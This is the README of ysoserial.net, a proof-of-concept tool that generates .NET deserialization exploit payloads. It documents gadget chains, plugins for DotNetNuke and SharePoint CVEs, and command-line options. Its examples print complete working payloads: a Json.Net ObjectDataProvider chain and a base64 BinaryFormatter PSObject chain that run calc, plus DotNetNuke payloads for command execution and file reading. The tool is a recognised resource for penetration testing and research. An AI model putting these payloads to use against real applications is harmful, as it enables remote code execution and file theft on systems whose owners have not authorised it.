![logo](/logo.png)
---
![GitHub CI](https://github.com/pwntester/ysoserial.net/workflows/GitHub%20CI/badge.svg?branch=master)
[![v2](https://img.shields.io/azure-devops/build/alvaro0002/ysoserial.net/1/v2.svg?label=v2%20branch)](https://dev.azure.com/alvaro0002/ysoserial.net/_build/latest?definitionId=1&branchName=v2)
[![download](https://img.shields.io/badge/dowload-latest-blue.svg)](https://github.com/pwntester/ysoserial.net/releases/latest)
[![license](https://img.shields.io/github/license/pwntester/ysoserial.net.svg)](LICENSE.txt)
![stars](https://img.shields.io/github/stars/pwntester/ysoserial.net.svg?style=social)
![forks](https://img.shields.io/github/forks/pwntester/ysoserial.net.svg?style=social)

A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.

## Description
ysoserial.net is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.

This project is inspired by [Chris Frohoff's ysoserial project](https://github.com/frohoff/ysoserial)

## Disclaimer 
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

This software is a personal project and not related with any companies, including Project owner and contributors employers.

## Usage
```
$ ./ysoserial -h
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

== GADGETS ==
	(*) ActivitySurrogateDisableTypeCheck [Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored]
		Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) ActivitySurrogateSelector [This gadget ignores the command parameter and executes the constructor of ExploitClass class] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter
	(*) ActivitySurrogateSelectorFromFile [Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter
	(*) AxHostState
		Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) ClaimsIdentity
		Formatters: BinaryFormatter , LosFormatter , SoapFormatter
	(*) DataSet
		Formatters: BinaryFormatter , LosFormatter , SoapFormatter
	(*) ObjectDataProvider (supports extra options: use the '--fullhelp' argument to view)
		Formatters: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , Xaml (4) , XmlSerializer , YamlDotNet < 5.0.0
	(*) PSObject [Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)]
		Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) RolePrincipal
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) SessionSecurityToken
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) SessionViewStateHistoryItem
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) TextFormattingRunProperties [This normally generates the shortest payload] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter , DataContractSerializer , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) TypeConfuseDelegate
		Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer
	(*) TypeConfuseDelegateMono [Tweaked TypeConfuseDelegate gadget to work with Mono]
		Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer
	(*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (3) , DataContractSerializer (2) , Json.Net (2) , LosFormatter (3) , NetDataContractSerializer (3) , SoapFormatter (2)
	(*) WindowsIdentity
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter

== PLUGINS ==
	(*) ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)
	(*) Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
	(*) ApplicationTrust (Generates XML payload for the ApplicationTrust class)
	(*) Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)
	(*) DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
	(*) Resx (Generates RESX files)
	(*) SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
	(*) SharePoint (Generates poayloads for the following SharePoint CVEs: CVE-2019-0604, CVE-2018-8421)
	(*) TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)
	(*) ViewState (Generates a ViewState using known MachineKey parameters)

Note: Machine authentication code (MAC) key modifier is not being used for LosFormatter in ysoserial.net. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.

Usage: ysoserial.exe [options]
Options:
  -p, --plugin=VALUE         The plugin to be used.
  -o, --output=VALUE         The output format (raw|base64). Default: raw
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter.
  -c, --command=VALUE        The command to be executed.
      --rawcmd               Command will be executed as is without `cmd /c ` 
                               being appended (anything after first space is an 
                               argument).
  -s, --stdin                The command to be executed will be read from 
                               standard input.
  -t, --test                 Whether to run payload locally. Default: false
      --minify               Whether to minify the payloads where applicable. 
                               Default: false
      --ust, --usesimpletype This is to remove additional info only when 
                               minifying and FormatterAssemblyStyle=Simple 
                               (always `true` with `--minify` for binary 
                               formatters). Default: true
      --raf, --runallformatters
                             Whether to run all the gadgets with the provided 
                               formatter (ignores gagdet name, output format, 
                               and the test flag). This will search in 
                               formatters and also show the displayed payload 
                               length. Default: false
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant 
                               gadgets and their formatters (other parameters 
                               will be ignored).
      --debugmode            Enable debugging to show exception errors and 
                               output length
  -h, --help                 Shows this message and exit.
      --fullhelp             Shows this message + extra options for gadgets 
                               and plugins and exit.
      --credit               Shows the credit/history of gadgets and plugins 
                               (other parameters will be ignored).
```

*Note:* When specifying complex commands, it can be tedious to escape some special character (;, |, &, ..). Use stdin option (-s) to read the command from stdin:

```
cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
```

*Note:* XmlSerializer and DataContractSerializer formatters generate a wrapper Xml format including the expected type on the "type" attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated xml based on how XmlSerializer gets the expected type in your case.

## Plugins
Ysoserial.Net can be used to generate raw payloads or more complex ones using a plugin architecture. To use plugins, use `-p <plugin name>` followed by the plugin options (the rest of ysoserial.net options will be ignored). Eg:

```
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
```

For more help on plugin options use `-h` along with `-p <plugin name>`. Eg:

```
$ ./ysoserial.exe -h -p DotNetNuke
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Plugin:

DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)

Options:

  -m, --mode=VALUE           the payload mode: read_file, upload_file, run_command.
  -c, --command=VALUE        the command to be executed in run_command mode.
  -u, --url=VALUE            the url to fetch the file from in write_file mode.
  -f, --file=VALUE           the file to read in read_file mode or the file to write to in write_file_mode.
```

## Examples

### Generate a **calc.exe** payload for Json.Net using *ObjectDataProvider* gadget.
```
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/ccalc']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### Generate a **calc.exe** payload for BinaryFormatter using *PSObject* gadget.
```
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=
```

### Generate a run_command payload for DotNetNuke using its plugin
```
$ ./ysoserial.exe -p DotNetNuke -M run_command -C calc.exe
<profile><item key="foo" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=" [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) " xmlns:xsi=" [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) "><ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type="xsd:string">/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=</anyType></MethodParameters><ObjectInstance xsi:type="ObjectStateFormatter"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>
```

### Generate a read_file payload for DotNetNuke using its plugin
```
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

## v2 Branch
v2 branch is a copy of ysoserial.net (15/03/2018) that has been changed to work with .NET Framework 2.0 by [irsdl](https://github.com/irsdl). Although this project can be used with applications that use .NET Framework v2.0, it also requires .NET Framework 3.5 to be installed on the target box as the gadgets depend on it. This problem will be resolved if new gadgets in .NET Framework 2.0 become identified in the future.

## Contributing
- Fork it
- Create your feature branch (`git checkout -b my-new-feature`)
- Commit your changes (`git commit -am 'Add some feature'`)
- Push to the branch (`git push origin my-new-feature`)
- Create new Pull Request

## Thanks
Special thanks to all contributors:
- [Oleksandr Mirosh](https://twitter.com/olekmirosh)
- [irsdl](https://github.com/irsdl)
- [JarLob](https://github.com/JarLob)
- [DS-Kurt-Boberg](https://github.com/DS-Kurt-Boberg)
- [mwulftange](https://github.com/mwulftange)
- [yallie](https://github.com/yallie)
- [paralax](https://github.com/paralax)

## Credits
```
$ ./ysoserial.exe --credit

ysoserial.net has been developed by Alvaro Muñoz (@pwntester)

Credits for available gadgets:
	ActivitySurrogateDisableTypeCheck
		[Finders: Nick Landers]
	ActivitySurrogateSelector
		[Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]
	ActivitySurrogateSelectorFromFile
		[Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]
	AxHostState
		[Finders: Soroush Dalili]
	ClaimsIdentity
		[Finders: Soroush Dalili]
	DataSet
		[Finders: James Forshaw] [Contributors: Soroush Dalili]
	ObjectDataProvider
		[Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz, Soroush Dalili]
	PSObject
		[Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz]
	ResourceSet
		[Finders: Soroush Dalili]
	RolePrincipal
		[Finders: Soroush Dalili]
	SessionSecurityToken
		[Finders: @mufinnnnnnn, Soroush Dalili] [Contributors: Soroush Dalili]
	SessionViewStateHistoryItem
		[Finders: Soroush Dalili]
	TextFormattingRunProperties
		[Finders: Oleksandr Mirosh and Alvaro Munoz] [Contributors: Alvaro Munoz, Soroush Dalili]
	TypeConfuseDelegate
		[Finders: James Forshaw] [Contributors: Alvaro Munoz]
	TypeConfuseDelegateMono
		[Finders: James Forshaw] [Contributors: Denis Andzakovic]
	WindowsClaimsIdentity
		[Finders: Soroush Dalili]
	WindowsIdentity
		[Finders: Levi Broderick] [Contributors: Alvaro Munoz, Soroush Dalili]

Credits for available plugins:
	ActivatorUrl
		Harrison Neal
	Altserialization
		Soroush Dalili
	ApplicationTrust
		Soroush Dalili
	Clipboard
		Soroush Dalili
	DotNetNuke
		discovered by Oleksandr Mirosh and Alvaro Munoz, implemented by Alvaro Munoz, tested by @GlitchWitch
	Resx
		Soroush Dalili
	SessionSecurityTokenHandler
		Soroush Dalili
	SharePoint
		CVE-2019-0604: Markus Wulftange, CVE-2018-8421: Soroush Dalili, implemented by Soroush Dalili
	TransactionManagerReenlist
		Soroush Dalili
	ViewState
		Soroush Dalili

Various other people have also donated their time and contributed to this project.
Please see https://github.com/pwntester/ysoserial.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.
```

## Additional Reading
- [Attacking .NET serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)
- [Friday the 13th: JSON Attacks - Slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [Friday the 13th: JSON Attacks - Whitepaper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- [Friday the 13th: JSON Attacks - Video(demos)](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
- [Are you my Type? - Slides](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
- [Are you my Type? - Whitepaper](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [Exploiting .NET Managed DCOM](https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html)
- [Finding and Exploiting .NET Remoting over HTTP using Deserialisation](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/)

## ysoserial.net references in the wild
### Research:
- https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/
- https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/
- https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
- https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/?research=Whitepapers
- https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282
- https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/
- https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/august/getting-shell-with-xamlx-files/
- https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/

### Usage:
- https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6
- https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/
- https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/
- https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html
- https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution
- https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf
- https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
- https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server
- https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
